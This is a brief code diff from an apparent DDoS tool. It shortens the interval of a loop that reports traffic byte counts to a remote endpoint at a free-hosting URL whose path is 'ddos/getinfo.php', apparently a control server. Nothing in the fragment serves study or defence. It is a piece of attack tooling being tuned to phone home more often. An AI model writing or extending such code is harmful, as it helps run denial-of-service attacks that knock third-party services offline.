@@ -404,7 +404,7 @@ cur_bytes = 0
 def send_data():
     global cur_bytes
     while True:
-        time.sleep(1200)
+        time.sleep(5)
         b = stats.get_bytes()
         print(b)
         requests.get("https://roflclicker.000webhostapp.com/ddos/getinfo.php?bytes="+str(b-cur_bytes))
